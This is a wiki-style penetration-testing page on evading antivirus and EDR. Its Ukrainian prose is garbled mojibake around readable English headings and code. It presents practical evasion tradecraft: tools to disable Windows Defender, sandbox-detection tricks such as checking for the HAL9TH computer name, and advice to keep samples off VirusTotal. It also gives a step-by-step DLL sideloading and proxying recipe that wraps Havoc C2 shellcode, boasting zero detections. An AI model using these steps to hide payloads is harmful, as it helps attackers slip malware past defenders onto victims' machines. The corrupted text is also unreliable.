# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**–¶—é —Å—Ç–æ—Ä—ñ–Ω–∫—É –Ω–∞–ø–∏—Å–∞–≤(–ª–∞)** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ —Ä–æ–±–æ—Ç–∏ Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ —Ä–æ–±–æ—Ç–∏ Windows Defender —à–ª—è—Ö–æ–º —ñ–º—ñ—Ç–∞—Ü—ñ—ó —ñ–Ω—à–æ–≥–æ AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

–ù–∞—Ä–∞–∑—ñ AVs –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è, —á–∏ —î —Ñ–∞–π–ª —à–∫—ñ–¥–ª–∏–≤–∏–º: static detection, dynamic analysis, –∞ –¥–ª—è –±—ñ–ª—å—à –ø—Ä–æ—Å—É–Ω—É—Ç–∏—Ö EDRs ‚Äî behavioural analysis.

### **Static detection**

Static detection –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö —à–∫—ñ–¥–ª–∏–≤–∏—Ö —Ä—è–¥–∫—ñ–≤ –∞–±–æ –º–∞—Å–∏–≤—ñ–≤ –±–∞–π—Ç—ñ–≤ —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ —Å–∫—Ä–∏–ø—Ç—ñ, –∞ —Ç–∞–∫–æ–∂ –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è–º —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ —Å–∞–º–æ–≥–æ —Ñ–∞–π–ª—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, file description, company name, digital signatures, icon, checksum —Ç–æ—â–æ). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—ñ–¥–æ–º–∏—Ö –ø—É–±–ª—ñ—á–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –º–æ–∂–µ —à–≤–∏–¥—à–µ –≤–∞—Å –≤–∏–¥–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ —ó—Ö, –π–º–æ–≤—ñ—Ä–Ω–æ, –≤–∂–µ –ø—Ä–æ–∞–Ω–∞–ª—ñ–∑—É–≤–∞–ª–∏ —Ç–∞ –ø–æ–∑–Ω–∞—á–∏–ª–∏ —è–∫ —à–∫—ñ–¥–ª–∏–≤—ñ. –Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ —Ç–∞–∫–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è:

- **–®–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è**

–Ø–∫—â–æ –≤–∏ –∑–∞—à–∏—Ñ—Ä—É—î—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫, AV –Ω–µ –∑–º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ –≤–∞—à—É –ø—Ä–æ–≥—Ä–∞–º—É, –∞–ª–µ –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è —è–∫–∏–π—Å—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á, —â–æ–± —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º—É –≤ –ø–∞–º'—è—Ç—ñ.

- **–û–±—Ñ—É—Å–∫–∞—Ü—ñ—è**

–Ü–Ω–æ–¥—ñ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–æ—Å—Ç–æ –∑–º—ñ–Ω–∏—Ç–∏ –¥–µ—è–∫—ñ —Ä—è–¥–∫–∏ —É –≤–∞—à–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –∞–±–æ —Å–∫—Ä–∏–ø—Ç—ñ, —â–æ–± –ø—Ä–æ–π—Ç–∏ –ø–æ–≤–∑ AV, –∞–ª–µ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —Ç—Ä—É–¥–æ–º—ñ—Å—Ç–∫–∏–º –∑–∞–≤–¥–∞–Ω–Ω—è–º –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —â–æ —Å–∞–º–µ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—å –æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏.

- **–í–ª–∞—Å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**

–Ø–∫—â–æ –≤–∏ —Ä–æ–∑—Ä–æ–±–ª—è—î—Ç–µ –≤–ª–∞—Å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –Ω–µ –±—É–¥–µ –≤—ñ–¥–æ–º–∏—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä, –∞–ª–µ —Ü–µ –∑–∞–π–º–∞—î –±–∞–≥–∞—Ç–æ —á–∞—Å—É —Ç–∞ –∑—É—Å–∏–ª—å.

> [!TIP]
> –ì–∞—Ä–Ω–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å—Ç–∞—Ç–∏—á–Ω–µ –≤–∏—è–≤–ª–µ–Ω–Ω—è Windows Defender ‚Äî —Ü–µ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). –í—ñ–Ω —Ñ–∞–∫—Ç–∏—á–Ω–æ —Ä–æ–∑–±–∏–≤–∞—î —Ñ–∞–π–ª –Ω–∞ –∫—ñ–ª—å–∫–∞ —Å–µ–≥–º–µ–Ω—Ç—ñ–≤ —ñ –ø—Ä–æ—Å–∏—Ç—å Defender –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏ –∫–æ–∂–µ–Ω –æ–∫—Ä–µ–º–æ, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –º–æ–∂–Ω–∞ —Ç–æ—á–Ω–æ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫—ñ —Ä—è–¥–∫–∏ –∞–±–æ –±–∞–π—Ç–∏ —É –≤–∞—à–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –ø–æ–∑–Ω–∞—á–µ–Ω—ñ.

–†–µ–∫–æ–º–µ–Ω–¥—É—é –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Ü–µ–π [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) –ø—Ä–æ –ø—Ä–∞–∫—Ç–∏—á–Ω—É AV Evasion.

### **Dynamic analysis**

Dynamic analysis ‚Äî —Ü–µ –∫–æ–ª–∏ AV –∑–∞–ø—É—Å–∫–∞—î –≤–∞—à –±—ñ–Ω–∞—Ä–Ω–∏–∫ —É sandbox —ñ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ —à–∫—ñ–¥–ª–∏–≤–æ—é –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–ø—Ä–æ–±–∏ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —Ç–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –±—Ä–∞—É–∑–µ—Ä–∞, –≤–∏–∫–æ–Ω–∞—Ç–∏ minidump –Ω–∞ LSASS —Ç–æ—â–æ). –ó —Ü–∏–º –º–æ–∂–µ –±—É—Ç–∏ —Ç—Ä–æ—Ö–∏ —Å–∫–ª–∞–¥–Ω—ñ—à–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏, –∞–ª–µ –æ—Å—å –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π, —è–∫—ñ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ sandbox.

- **–ó–∞—Ç—Ä–∏–º–∫–∞ (sleep) –ø–µ—Ä–µ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º** –í –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ —Ö–æ—Ä–æ—à–∏–º —Å–ø–æ—Å–æ–±–æ–º –æ–±—ñ–π—Ç–∏ dynamic analysis AV. AV –º–∞—é—Ç—å –¥—É–∂–µ –º–∞–ª–∏–π —á–∞—Å –Ω–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —â–æ–± –Ω–µ –ø–µ—Ä–µ—Ä–∏–≤–∞—Ç–∏ —Ä–æ–±–æ—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–≤–≥–∏—Ö –∑–∞—Ç—Ä–∏–º–æ–∫ –º–æ–∂–µ –ø–æ—Ä—É—à–∏—Ç–∏ –∞–Ω–∞–ª—ñ–∑ –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤. –ü—Ä–æ–±–ª–µ–º–∞ –≤ —Ç–æ–º—É, —â–æ –±–∞–≥–∞—Ç–æ sandbox –º–æ–∂—É—Ç—å –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–∏ sleep –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
- **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ä–µ—Å—É—Ä—Å—ñ–≤ –º–∞—à–∏–Ω–∏** –ó–∞–∑–≤–∏—á–∞–π sandbox –º–∞—é—Ç—å –¥—É–∂–µ –æ–±–º–µ–∂–µ–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, < 2GB RAM), —ñ–Ω–∞–∫—à–µ –≤–æ–Ω–∏ –º–æ–≥–ª–∏ –± —É–ø–æ–≤—ñ–ª—å–Ω—é–≤–∞—Ç–∏ –º–∞—à–∏–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢—É—Ç –º–æ–∂–Ω–∞ –ø—Ä–æ—è–≤–∏—Ç–∏ –∫—Ä–µ–∞—Ç–∏–≤–Ω—ñ—Å—Ç—å, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä—É CPU –∞–±–æ —à–≤–∏–¥–∫—ñ—Å—Ç—å –≤–µ–Ω—Ç–∏–ª—è—Ç–æ—Ä—ñ–≤ ‚Äî –Ω–µ –≤—Å–µ –±—É–¥–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –≤ sandbox.
- **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∏, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –¥–ª—è –º–∞—à–∏–Ω–∏** –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ —Ç–∞—Ä–≥–µ—Ç—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —á–∏—è —Ä–æ–±–æ—á–∞ —Å—Ç–∞–Ω—Ü—ñ—è –ø—Ä–∏—î–¥–Ω–∞–Ω–∞ –¥–æ –¥–æ–º–µ–Ω—É "contoso.local", –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –¥–æ–º–µ–Ω –∫–æ–º–ø'—é—Ç–µ—Ä–∞ —ñ, —è–∫—â–æ –≤—ñ–Ω –Ω–µ –∑–±—ñ–≥–∞—î—Ç—å—Å—è, –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏.

–í–∏—è–≤–∏–ª–æ—Å—å, —â–æ computername sandbox-–∞ Microsoft Defender ‚Äî HAL9TH, —Ç–æ–∂ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ —ñ–º'—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞ —É –≤–∞—à–æ–º—É malware –ø–µ—Ä–µ–¥ –¥–µ—Ç–æ–Ω–∞—Ü—ñ—î—é; —è–∫—â–æ —ñ–º'—è —Å–ø—ñ–≤–ø–∞–¥–∞—î –∑ HAL9TH ‚Äî –≤–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Defender's sandbox —ñ –º–æ–∂–µ—Ç–µ –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>–¥–∂–µ—Ä–µ–ª–æ: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

–î–µ–∫—ñ–ª—å–∫–∞ —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å–Ω–∏—Ö –ø–æ—Ä–∞–¥ –≤—ñ–¥ [@mgeeky](https://twitter.com/mariuszbit) –¥–ª—è –ø—Ä–æ—Ç–∏–¥—ñ—ó Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> –∫–∞–Ω–∞–ª #malware-dev</p></figcaption></figure>

–Ø–∫ –º–∏ –≤–∂–µ –∫–∞–∑–∞–ª–∏ —Ä–∞–Ω—ñ—à–µ, **–ø—É–±–ª—ñ—á–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏** –∑—Ä–µ—à—Ç–æ—é **–±—É–¥—É—Ç—å –≤–∏—è–≤–ª–µ–Ω—ñ**, —Ç–æ–∂ –≤–∞—Ä—Ç–æ –ø–æ—Å—Ç–∞–≤–∏—Ç–∏ —Å–æ–±—ñ –ø–∏—Ç–∞–Ω–Ω—è:

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥–∞–º–ø–∏—Ç–∏ LSASS, **—á–∏ –¥—ñ–π—Å–Ω–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ mimikatz**? –ê–±–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ–Ω—à–∏–π, –º–µ–Ω—à –≤—ñ–¥–æ–º–∏–π –ø—Ä–æ—î–∫—Ç, —è–∫–∏–π —Ç–∞–∫–æ–∂ –¥–∞–º–ø–∏—Ç—å LSASS.

–ü—Ä–∞–≤–∏–ª—å–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å, —à–≤–∏–¥—à–µ –∑–∞ –≤—Å–µ, ‚Äî –¥—Ä—É–≥–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç. –ù–∞ –ø—Ä–∏–∫–ª–∞–¥—ñ mimikatz: —Ü–µ, –π–º–æ–≤—ñ—Ä–Ω–æ, –æ–¥–∏–Ω —ñ–∑ –Ω–∞–π–±—ñ–ª—å—à, —è–∫—â–æ –Ω–µ –Ω–∞–π–ø–æ–º—ñ—Ç–Ω—ñ—à–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –¥–ª—è AV —ñ EDR; —Ö–æ—á–∞ –ø—Ä–æ—î–∫—Ç –∫—Ä—É—Ç–∏–π, –∑ –Ω–∏–º —Å–∫–ª–∞–¥–Ω–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –≤ –ø–ª–∞–Ω—ñ –æ–±—Ö–æ–¥—É AV, —Ç–æ–∂ –ø—Ä–æ—Å—Ç–æ —à—É–∫–∞–π—Ç–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∏ –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –≤–∞—à–æ—ó –º–µ—Ç–∏.

> [!TIP]
> –ü—Ä–∏ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó payloads –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –æ–±–æ–≤'—è–∑–∫–æ–≤–æ –≤–∏–º–∫–Ω—ñ—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω—É –≤—ñ–¥–ø—Ä–∞–≤–∫—É –∑—Ä–∞–∑–∫—ñ–≤ —É Defender, —ñ, —Å–µ—Ä–π–æ–∑–Ω–æ, **–ù–ï –ó–ê–í–ê–ù–¢–ê–ñ–£–ô–¢–ï –ù–ê VIRUSTOTAL**, —è–∫—â–æ –≤–∞—à–∞ –º–µ—Ç–∞ ‚Äî –¥–æ–≤–≥–æ—Ç—Ä–∏–≤–∞–ª–∞ –µ–≤–∞–∑—ñ—è. –Ø–∫—â–æ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤–∏—è–≤–ª—è—î –ø–µ–≤–Ω–∏–π AV –≤–∞—à payload, –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –π–æ–≥–æ —É VM, —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–º–∫–Ω—É—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω—É –≤—ñ–¥–ø—Ä–∞–≤–∫—É –∑—Ä–∞–∑–∫—ñ–≤ —ñ —Ç–µ—Å—Ç—É–π—Ç–µ —Ç–∞–º, –¥–æ–∫–∏ –Ω–µ –±—É–¥–µ –∑–∞–¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—É.

## EXEs vs DLLs

–ö–æ–ª–∏ —Ü–µ –º–æ–∂–ª–∏–≤–æ, –∑–∞–≤–∂–¥–∏ **–Ω–∞–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é DLL –¥–ª—è –µ–≤–∞–∑—ñ—ó**: –∑ –º–æ–≥–æ –¥–æ—Å–≤—ñ–¥—É, DLL-—Ñ–∞–π–ª–∏ –∑–∞–∑–≤–∏—á–∞–π **–Ω–∞–±–∞–≥–∞—Ç–æ –º–µ–Ω—à–µ –≤–∏—è–≤–ª—è—é—Ç—å—Å—è** —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É—é—Ç—å—Å—è, —Ç–æ–∂ —Ü–µ –¥—É–∂–µ –ø—Ä–æ—Å—Ç–∞ —Ö–∏—Ç—Ä—ñ—Å—Ç—å, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö (—è–∫—â–æ –≤–∞—à payload –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è —è–∫ DLL, –∑–≤—ñ—Å–Ω–æ).

–Ø–∫ –≤–∏–¥–Ω–æ –Ω–∞ —Ü—å–æ–º—É –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—ñ, DLL Payload –≤—ñ–¥ Havoc –º–∞—î —Ä—ñ–≤–µ–Ω—å –≤–∏—è–≤–ª–µ–Ω–Ω—è 4/26 –Ω–∞ antiscan.me, —Ç–æ–¥—ñ —è–∫ EXE payload –º–∞—î 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>–ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –Ω–∞ antiscan.me –∑–≤–∏—á–∞–π–Ω–æ–≥–æ Havoc EXE payload –ø—Ä–æ—Ç–∏ –∑–≤–∏—á–∞–π–Ω–æ–≥–æ Havoc DLL</p></figcaption></figure>

–¢–µ–ø–µ—Ä –ø–æ–∫–∞–∂–µ–º–æ –∫—ñ–ª—å–∫–∞ —Ç—Ä—é–∫—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ DLL-—Ñ–∞–π–ª–∞–º–∏, —â–æ–± –±—É—Ç–∏ –∑–Ω–∞—á–Ω–æ –±—ñ–ª—å—à –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–º–∏.

## DLL Sideloading & Proxying

**DLL Sideloading** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É DLL, —è–∫–∏–π –∑–∞—Å—Ç–æ—Å–æ–≤—É—î loader, —Ä–æ–∑–º—ñ—â—É—é—á–∏ —è–∫ –∂–µ—Ä—Ç–≤—É-–ø—Ä–æ–≥—Ä–∞–º—É, —Ç–∞–∫ —ñ —à–∫—ñ–¥–ª–∏–≤—ñ payload(s) –ø–æ—Ä—É—á –æ–¥–∏–Ω –∑ –æ–¥–Ω–∏–º.

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏, –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ DLL Sideloading, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [Siofra](https://github.com/Cybereason/siofra) —Ç–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
–¶—è –∫–æ–º–∞–Ω–¥–∞ –≤–∏–≤–µ–¥–µ —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–≥—Ä–∞–º, –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –¥–æ DLL hijacking –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ "C:\Program Files\\" —Ç–∞ DLL-—Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –≤–æ–Ω–∏ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏.

–Ø –Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –≤–∞–º **explore DLL Hijackable/Sideloadable programs yourself**, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–æ—Å–∏—Ç—å –ø—Ä–∏—Ö–æ–≤–∞–Ω–∞, —è–∫—â–æ –≤–∏–∫–æ–Ω–∞–Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –∞–ª–µ —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –ø—É–±–ª—ñ—á–Ω–æ –≤—ñ–¥–æ–º—ñ DLL Sideloadable programs, –≤–∞—Å –º–æ–∂—É—Ç—å –ª–µ–≥–∫–æ –≤–∏–∫—Ä–∏—Ç–∏.

–ü—Ä–æ—Å—Ç–æ –ø–æ–º—ñ—Å—Ç–∏–≤—à–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π DLL –∑ —ñ–º–µ–Ω–µ–º, —è–∫–µ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –≤–∞—à payload, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î –ø–µ–≤–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ü—å–æ–≥–æ DLL; —â–æ–± –≤–∏–ø—Ä–∞–≤–∏—Ç–∏ —Ü—é –ø—Ä–æ–±–ª–µ–º—É, –º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ —ñ–Ω—à—É —Ç–µ—Ö–Ω—ñ–∫—É, —è–∫–∞ –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è **DLL Proxying/Forwarding**.

**DLL Proxying** –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤–∏–∫–ª–∏–∫–∏, —è–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–∞ —Ä–æ–±–∏—Ç—å, –∑ proxy (and malicious) DLL –¥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ DLL, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª—è—é—á–∏ –æ–±—Ä–æ–±–ª—è—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ payload.

–Ø –±—É–¥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ—î–∫—Ç [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) –≤—ñ–¥ [@flangvik](https://twitter.com/Flangvik/)

–û—Å—å –∫—Ä–æ–∫–∏, —è–∫—ñ —è –≤–∏–∫–æ–Ω–∞–≤:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
–û—Å—Ç–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∞ –Ω–∞–¥–∞—Å—Ç—å –Ω–∞–º –¥–≤–∞ —Ñ–∞–π–ª–∏: —à–∞–±–ª–æ–Ω –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É DLL —ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—É DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

–Ü –Ω–∞—à shellcode (–∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [SGN](https://github.com/EgeBalci/sgn)) —ñ proxy DLL –º–∞—é—Ç—å 0/26 Detection rate –Ω–∞ [antiscan.me](https://antiscan.me)! –Ø –≤–≤–∞–∂–∞—é —Ü–µ —É—Å–ø—ñ—Ö–æ–º.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> –Ø **–Ω–∞–ø–æ–ª–µ–≥–ª–∏–≤–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é** –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) –ø—Ä–æ DLL Sideloading, –∞ —Ç–∞–∫–æ–∂ [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), —â–æ–± –¥–µ—Ç–∞–ª—å–Ω—ñ—à–µ –æ–∑–Ω–∞–π–æ–º–∏—Ç–∏—Å—è –∑ —Ç–∏–º, –ø—Ä–æ —â–æ –º–∏ –≥–æ–≤–æ—Ä–∏–ª–∏.

